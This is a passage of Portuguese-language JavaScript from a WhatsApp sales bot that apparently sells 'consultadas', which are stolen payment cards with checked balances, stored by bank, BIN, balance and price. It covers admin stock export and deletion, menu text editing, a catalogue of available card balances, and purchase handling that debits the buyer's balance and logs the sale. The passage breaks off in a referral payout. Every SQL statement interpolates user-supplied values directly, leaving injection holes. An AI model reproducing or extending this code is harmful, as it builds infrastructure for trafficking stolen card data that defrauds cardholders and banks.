        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/baixarestoqueconsultada") > -1 && Adms.includes(Numero)) {
            Texto = `Gerando arquivo...`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            Array_MATERIAL = await DataBase_Better.prepare(`SELECT * FROM CONSULTADAS`).all();
            //shuffle(Array_MATERIAL);

            today = new Date();
            today.setHours(today.getHours() + 0);
            Nome_File_Visual = `${Nome_Dono} ${Array_MATERIAL.length} Consultadas Data ${today}.txt`
            Nome_File_Visual = Nome_File_Visual.replace(/\\/igm, '/');
            Nome_File_Visual = Nome_File_Visual.replace(/\s\(Horário Padrão de Brasília\)/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\sGMT\-0300/igm, '');
            Nome_File_Visual = Nome_File_Visual.replace(/\:/igm, ' ');

            Nome_File = __dirname + `\\Pacotes\\${Nome_File_Visual}`

            //console.log(Nome_File_Visual)
            //console.log(Nome_File)

            message = fs.createWriteStream(Nome_File);
            for (var index = 0; index < Array_MATERIAL.length; index++) {
                console.log(`${Array_MATERIAL[index]["BANCO"]}|${Array_MATERIAL[index]["SALDO"]}|${Array_MATERIAL[index]["PRECO"]}|${Array_MATERIAL[index]["INFORMACOES_ADICIONAIS"]}`)
                message.write(`${Array_MATERIAL[index]["BANCO"]}|${Array_MATERIAL[index]["SALDO"]}|${Array_MATERIAL[index]["PRECO"]}|${Array_MATERIAL[index]["INFORMACOES_ADICIONAIS"]}\n`);
                if (index === parseInt(Array_MATERIAL.length) - 1) {
                    //console.log("Foi")
                    await delay(2000)
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendFile',
'${Nome_File_Visual}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${Nome_File}',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto === "/deletarestoqueconsultada" && Adms.includes(Numero)) {
            await DataBase_Better.prepare(`DELETE FROM CONSULTADAS`).run();
            Texto = `*ESTOQUE DE CONSULTADAS DELETADO COM SUCESSO!*`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textomenuconsultada===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "") {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                TEXTO_MENU_CONSULTADA = msg[1]
                TEXTO_MENU_CONSULTADA = TEXTO_MENU_CONSULTADA.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_MENU_CONSULTADA}' WHERE PARAMETRO = 'TEXTO_MENU_CONSULTADA'`).run()

                Texto = `*TEXTO DO MENU DE CONSULTADAS ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/textocomprouconsultada===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                MENSAGEM_AO_COMPRAR_CONSULTADA = msg[1]
                MENSAGEM_AO_COMPRAR_CONSULTADA = MENSAGEM_AO_COMPRAR_CONSULTADA.replace(/\'/igm, "")
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${MENSAGEM_AO_COMPRAR_CONSULTADA}' WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_CONSULTADA'`).run()

                Texto = `*TEXTO A EXIBIR QUANDO CLIENTE COMPRAR CONSULTADAS, ALTERADO COM SUCESSO!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳




        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_ID_Lista_Array_Partes[1] === "catalogo_consutadas") {
            iD_Footer = Date.now()

            Categorias = await DataBase_Better.prepare(`SELECT _rowid_ FROM CONSULTADAS`).all();
            if (Categorias.length === 0) {

                Texto = `*INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Texto = `⚠️ *ATENÇÃO ADM* ⚠️

Usuário: wa.me/${Numero}

Tentou efetuar a compra de Consultadas, mas o estoque está vazio!`
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            TEXTO_MENU_CONSULTADA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_MENU_CONSULTADA'`).get()["VALOR"]

            CONSTRUCAO_LISTMESSAGE_buttonText = `CATÁLOGO CONSULTADAS`
            CONSTRUCAO_LISTMESSAGE_title = "Selecione a consultada e clique no botão enviar para comprar."
            CONSTRUCAO_LISTMESSAGE_description = `Clique em *Opções de Consultadas* para escolher a Consultadas desejada.

◆ ━━━━❪✪❫━━━━ ◆
❖ *Seu número:* ${Numero}
❖ *Saldo Atual:* R\$: ${SALDO_USUARIO}
◆ ━━━━❪✪❫━━━━ ◆

${TEXTO_MENU_CONSULTADA}

◆ ━━━━❪✪❫━━━━ ◆
⚠️*MUITA ATENÇÃO AO ESCOLHER A CONSULTADA DESEJADA!*⚠️`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            Array_CCs = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CONSULTADAS`).all();
            for await (item of Array_CCs) {
                ID = item["rowid"]
                BANCO = item["BANCO"]
                SALDO = item["SALDO"]
                PRECO = item["PRECO"]

                CONSTRUCAO_LISTMESSAGE_rows.push({
                    rowId: `${iD_Footer.toString()}|id_consultada_sera_comprada|${ID}`,
                    title: `R$:${SALDO} Disponível`,
                    description: `💰PREÇO: R$:${PRECO}
🏦${BANCO}
ID: ${ID}
`
                })
            }
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_ID_Lista_Array_Partes[1] === "id_consultada_sera_comprada") {

            ID = Mensagem_ID_Lista_Array_Partes[2]

            ROWID = await DataBase_Better.prepare(`SELECT _rowid_ FROM CONSULTADAS WHERE _rowid_ = '${ID}'`).get()
            if (ROWID === undefined) {
                Texto = `Desculpe, outra pessoa comprou esta Consultada, escolha outra!`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            item = await DataBase_Better.prepare(`SELECT * FROM CONSULTADAS WHERE _rowid_ = '${ID}'`).get();

            BANCO = item["BANCO"]
            BIN = item["BIN"]
            SALDO = item["SALDO"]
            PRECO = item["PRECO"]
            INFORMACOES_ADICIONAIS = item["INFORMACOES_ADICIONAIS"]

            PRECO_MATERIAL = parseFloat(PRECO).toFixed(2)

            SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
            SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);
            if (parseFloat(SALDO_USUARIO) < parseFloat(PRECO_MATERIAL)) {

                Texto = `⚠️ *Você não possui saldo suficiente para comprar esta Consultada.*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(PRECO_MATERIAL)
            NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2)

            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
            await DataBase_Better.prepare(`INSERT INTO CONSULTADAS_VENDIDAS (BANCO,BIN,SALDO,PRECO,INFORMACOES_ADICIONAIS,NUMERO_COMPRADOR,DATA_MS_INSERIDO) VALUES ('${BANCO}','${BIN}','${SALDO}','${PRECO}','${INFORMACOES_ADICIONAIS}','${Mensagem_From}','${Date.now()}')`).run()
            await DataBase_Better.prepare(`DELETE FROM CONSULTADAS WHERE _rowid_ = ${ID}`).run()

            VALOR_BASE_INDIC = PRECO_MATERIAL
            Contato_Temp_Indic = Mensagem_From
            FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
            if (FUNCAO_ASSOCIADOS_PAGO === "1") {
                ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
                if (ATIVAR_ASSOCIADOS === "1") {

                    Ja_tem_Indicador = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()
                    if (Ja_tem_Indicador["NUMERO_INDICADOR"] != "0") {
                        NUMERO_INDICADOR = await DataBase_Better.prepare(`SELECT NUMERO_INDICADOR FROM CONTATOS WHERE ID_CONTATO = '${Contato_Temp_Indic}'`).get()["NUMERO_INDICADOR"]
